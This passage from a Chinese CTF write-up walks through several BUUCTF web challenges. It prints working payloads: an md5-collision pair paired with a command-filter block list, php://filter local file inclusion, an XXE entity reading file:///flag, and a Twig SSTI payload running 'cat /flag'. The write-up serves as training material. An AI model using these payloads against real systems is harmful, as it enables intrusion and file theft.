    die(&#34;xixi～ no flag&#34;);
} else {
    $txt = base64_encode(file_get_contents($file));
    echo &#34;&lt;img src=&#39;data:image/gif;base64,&#34; . $txt . &#34;&#39;&gt;&lt;/img&gt;&#34;;
    echo &#34;&lt;br&gt;&#34;;
}
echo $cmd;
echo &#34;&lt;br&gt;&#34;;
if (preg_match(&#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&#34;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&#34;, $cmd)) {
    echo(&#34;forbid ~&#34;);
    echo &#34;&lt;br&gt;&#34;;
} else {
    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) {
        echo `$cmd`;
    } else {
        echo (&#34;md5 is funny ~&#34;);
    }
}

?&gt;
&lt;html&gt;
&lt;style&gt;
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
&lt;/style&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><p>后面post的a和b用md5碰撞可以绕过</p>
<pre tabindex="0"><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>而前面的正则中过滤了很多（dir可以用），cat可以使用ca\t来绕过</p>
<p>tmd我也不知道咋回事，就一直不成功&hellip;（不知道是post的ab的问题还是传cmd的问题）然后就突然成功了，，，也不知道是哪里写的有问题。</p>
<p>对了，GET改POST的时候发的包也要改。</p>
<h2 id="0x28bsidescf-2020had-a-bad-day" class="heading-element">
  <a href="#0x28bsidescf-2020had-a-bad-day" class="heading-mark"></a>0x28.[BSidesCF 2020]Had a bad day</h2><blockquote>
<p>考点就是文件包含</p>
</blockquote>
<p>url中加了&rsquo;后报了错：</p>
<pre tabindex="0"><code>Warning: include(meowers‘’.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37

Warning: include(): Failed opening &#39;meowers‘’.php&#39; for inclusion (include_path=&#39;.:/usr/local/lib/php&#39;) in /var/www/html/index.php on line 37</code></pre><p>可能有文件包含的洞，然后用php伪协议读index.php，这里只写到了index，后面的php代码会自己加上：</p>
<p><code>category=php://filter/read=convert.base64-encode/resource=flag</code></p>
<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">.....other html
&lt;?php
$file = $_GET[&#39;category&#39;];
if(isset($file)) {
	if( strpos( $file, &#34;woofers&#34; ) !==  false || strpos( $file, &#34;meowers&#34; ) !==  false || strpos( $file, &#34;index&#34;)) {
		include ($file . &#39;.php&#39;);
	} else {
		echo &#34;Sorry, we currently only support woofers and meowers.&#34;;
	}
}
?&gt;
.....other html</code></pre><p>然后试了下：<code>category=woofers/../flag</code>，出现了<code>&lt;!-- Can you read this flag? --&gt;</code></p>
<p>之后看到了可以这样文件包含：</p>
<pre tabindex="0"><code>category=php://filter/read=convert.base64-encode/resource=flag
category=php://filter/read=convert.base64-encode/woofers/resource=flag
这样既有woofers，也不会影响文件包含</code></pre><p>可以拿到flag</p>
<h2 id="0x29nctf2019fake-xml-cookbook" class="heading-element">
  <a href="#0x29nctf2019fake-xml-cookbook" class="heading-mark"></a>0x29.[NCTF2019]Fake XML cookbook</h2><blockquote>
<p>考点：XXE</p>
<p><a href="https://xz.aliyun.com/t/6887"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/6887</a></p>
<p><a href="https://www.freebuf.com/vuls/175451.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/vuls/175451.html</a></p>
</blockquote>
<p>首先看题目就知道应该是XXE，源码：</p>
<div class="highlight" id="id-20"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="s1">&#39;text/javascript&#39;</span><span class="o">&gt;</span> 
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">doLogin</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#username&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;#password&#34;</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nx">username</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span> <span class="o">||</span> <span class="nx">password</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		<span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;Please enter the username and password!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="s2">&#34;&lt;user&gt;&lt;username&gt;&#34;</span> <span class="o">+</span> <span class="nx">username</span> <span class="o">+</span> <span class="s2">&#34;&lt;/username&gt;&lt;password&gt;&#34;</span> <span class="o">+</span> <span class="nx">password</span> <span class="o">+</span> <span class="s2">&#34;&lt;/password&gt;&lt;/user&gt;&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="nx">type</span><span class="o">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">url</span><span class="o">:</span> <span class="s2">&#34;doLogin.php&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">contentType</span><span class="o">:</span> <span class="s2">&#34;application/xml;charset=utf-8&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">data</span><span class="o">:</span> <span class="nx">data</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">dataType</span><span class="o">:</span> <span class="s2">&#34;xml&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">anysc</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">success</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        	<span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">result</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s2">&#34;code&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">childNodes</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">nodeValue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        	<span class="kd">var</span> <span class="nx">msg</span> <span class="o">=</span> <span class="nx">result</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s2">&#34;msg&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">childNodes</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">nodeValue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        	<span class="k">if</span><span class="p">(</span><span class="nx">code</span> <span class="o">==</span> <span class="s2">&#34;0&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        		<span class="nx">$</span><span class="p">(</span><span class="s2">&#34;.msg&#34;</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">msg</span> <span class="o">+</span> <span class="s2">&#34; login fail!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        	<span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">code</span> <span class="o">==</span> <span class="s2">&#34;1&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        		<span class="nx">$</span><span class="p">(</span><span class="s2">&#34;.msg&#34;</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">msg</span> <span class="o">+</span> <span class="s2">&#34; login success!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        		<span class="nx">$</span><span class="p">(</span><span class="s2">&#34;.msg&#34;</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="s2">&#34;error:&#34;</span> <span class="o">+</span> <span class="nx">msg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        	<span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="nx">error</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">XMLHttpRequest</span><span class="p">,</span><span class="nx">textStatus</span><span class="p">,</span><span class="nx">errorThrown</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">$</span><span class="p">(</span><span class="s2">&#34;.msg&#34;</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">errorThrown</span> <span class="o">+</span> <span class="s1">&#39;:&#39;</span> <span class="o">+</span> <span class="nx">textStatus</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span></span></span></code></pre></div><p>构造payload：</p>
<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY penson SYSTEM &#34;file:///flag&#34; &gt;
]&gt;
&lt;user&gt;&lt;username&gt;&amp;penson;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</code></pre><div class="highlight" id="id-22"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/doLogin.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">65f2487a-3114-4754-a3cf-450a6d829bde.node4.buuoj.cn:81</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl"><span class="n">If-Modified-Since</span><span class="o">:</span> <span class="l">Sat, 14 Dec 2019 15:09:41 GMT</span>
</span></span><span class="line"><span class="cl"><span class="n">If-None-Match</span><span class="o">:</span> <span class="l">&#34;1542-599ab5e1d7740-gzip&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">191</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="g">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
</span></span></span><span class="line"><span class="cl"><span class="g">&lt;!DOCTYPE xxe [
</span></span></span><span class="line"><span class="cl"><span class="g">&lt;!ELEMENT name ANY &gt;
</span></span></span><span class="line"><span class="cl"><span class="g">&lt;!ENTITY penson SYSTEM &#34;file:///flag&#34; &gt;
</span></span></span><span class="line"><span class="cl"><span class="g">]&gt;
</span></span></span><span class="line"><span class="cl"><span class="g">&lt;user&gt;&lt;username&gt;&amp;penson;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</span></span></span></code></pre></div><p>还看到一个师傅写的payload可以读doLogin.php文件：</p>
<pre tabindex="0"><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php&#34;&gt;
 ]&gt;
&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;456&lt;/password&gt;&lt;/user&gt;</code></pre><p>解码：</p>
<div class="highlight" id="id-24"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">* autor: c0ny1
</span></span></span><span class="line"><span class="cl"><span class="sd">* date: 2018-2-7
</span></span></span><span class="line"><span class="cl"><span class="sd">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$USERNAME</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$PASSWORD</span> <span class="o">=</span> <span class="s1">&#39;024b87931a03f738fff6693ce0a78c88&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">libxml_disable_entity_loader</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$xmlfile</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$dom</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMDocument</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$dom</span><span class="o">-&gt;</span><span class="na">loadXML</span><span class="p">(</span><span class="nv">$xmlfile</span><span class="p">,</span> <span class="nx">LIBXML_NOENT</span> <span class="o">|</span> <span class="nx">LIBXML_DTDLOAD</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$creds</span> <span class="o">=</span> <span class="nx">simplexml_import_dom</span><span class="p">(</span><span class="nv">$dom</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nv">$username</span> <span class="o">=</span> <span class="nv">$creds</span><span class="o">-&gt;</span><span class="na">username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$creds</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$username</span> <span class="o">==</span> <span class="nv">$USERNAME</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span> <span class="o">==</span> <span class="nv">$PASSWORD</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$result</span> <span class="o">=</span> <span class="nx">sprintf</span><span class="p">(</span><span class="s2">&#34;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="nv">$username</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$result</span> <span class="o">=</span> <span class="nx">sprintf</span><span class="p">(</span><span class="s2">&#34;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nv">$username</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>	
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$result</span> <span class="o">=</span> <span class="nx">sprintf</span><span class="p">(</span><span class="s2">&#34;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&#34;</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: text/html; charset=utf-8&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><h2 id="0x2abjdctf2020cookie-is-so-stable" class="heading-element">
  <a href="#0x2abjdctf2020cookie-is-so-stable" class="heading-mark"></a>0x2A.[BJDCTF2020]Cookie is so stable</h2><blockquote>
<p>SSTI模板注入漏洞：</p>
<p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/"target="_blank" rel="external nofollow noopener noreferrer">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/</a></p>
</blockquote>
<p>测试输入<code>{{7*'7'}}</code>结果为：49，是Twig。</p>
<p>然后注入点是在user：</p>
<div class="highlight" id="id-25"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/flag.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">48beec68-7c7c-44aa-8133-ee13e7e06236.node4.buuoj.cn:81</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://48beec68-7c7c-44aa-8133-ee13e7e06236.node4.buuoj.cn:81/flag.php</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=a792e0ea6d47a5e6e773e46b2b494dc1; user=%7B%7B7%2A%277%27%7D%7D</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span></span></span></code></pre></div><p>直接用上面文章的payload：</p>
<p><code>user={{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;cat /flag&quot;)}}</code></p>
<h2 id="0x2basis-2019unicorn-shop" class="heading-element">
  <a href="#0x2basis-2019unicorn-shop" class="heading-mark"></a>0x2B.[ASIS 2019]Unicorn shop</h2><blockquote>
<p>考点是编码相关的问题：</p>
<p><a href="https://xz.aliyun.com/t/5402#toc-0"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/5402#toc-0</a></p>
</blockquote>
<p>进去之后让你买东西，并且只能是一个字符<code>Only one char(?) allowed!</code>，（要买第四个最贵的那个）</p>
<p>有个网址：https://www.compart.com/en/unicode/</p>
<p>搜索thousand选一个大雨1337的就可以拿到flag</p>
<p>我选的是：<code>0xF0 0x90 0x84 0xAE</code>，然后改为%就可以了</p>
<h2 id="0x2c安洵杯-2019easy_serialize_php" class="heading-element">
  <a href="#0x2c%e5%ae%89%e6%b4%b5%e6%9d%af-2019easy_serialize_php" class="heading-mark"></a>0x2C.[安洵杯 2019]easy_serialize_php</h2><blockquote>
<p>考点就是PHP反序列化的字符逃逸</p>
<p><a href="https://blog.csdn.net/qq_45521281/article/details/107135706"target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/qq_45521281/article/details/107135706</a></p>
<p>自我感觉是一个很有意思的题。</p>
</blockquote>
<div class="highlight" id="id-26"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$function</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$img</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filter_arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;php&#39;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span><span class="s1">&#39;php5&#39;</span><span class="p">,</span><span class="s1">&#39;php4&#39;</span><span class="p">,</span><span class="s1">&#39;fl1g&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span><span class="nv">$filter_arr</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$img</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;user&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;guest&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;function&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$function</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$function</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;a href=&#34;index.php?f=highlight_file&#34;&gt;source_code&lt;/a&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img_path&#39;</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="s1">&#39;guest_img.png&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img_path&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$serialize_info</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$function</span> <span class="o">==</span> <span class="s1">&#39;highlight_file&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$function</span> <span class="o">==</span> <span class="s1">&#39;phpinfo&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;phpinfo();&#39;</span><span class="p">);</span> <span class="c1">//maybe you can find something in here!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$function</span> <span class="o">==</span> <span class="s1">&#39;show_image&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$userinfo</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$serialize_info</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$userinfo</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>传phpinfo的时候发现了 d0g3_f1ag.php文件。auto_append_file在所有页面的底部自动包含文件</p>
<div class="highlight" id="id-27"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">_SESSION</span><span class="p">[</span><span class="nx">user</span><span class="p">]</span><span class="o">=</span><span class="nx">flagflagflagflagflagflag</span><span class="o">&amp;</span><span class="nx">_SESSION</span><span class="p">[</span><span class="nx">function</span><span class="p">]</span><span class="o">=</span><span class="nx">a</span><span class="s2">&#34;;s:3:&#34;</span><span class="nx">img</span><span class="s2">&#34;;s:20:&#34;</span><span class="nx">ZDBnM19mMWFnLnBocA</span><span class="o">==</span><span class="s2">&#34;;s:2:&#34;</span><span class="nx">dd</span><span class="s2">&#34;;s:1:&#34;</span><span class="nx">a</span><span class="s2">&#34;;}&amp;function=show_image
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">extract(</span><span class="si">$_POST</span><span class="s2">) 存在变量覆盖漏洞
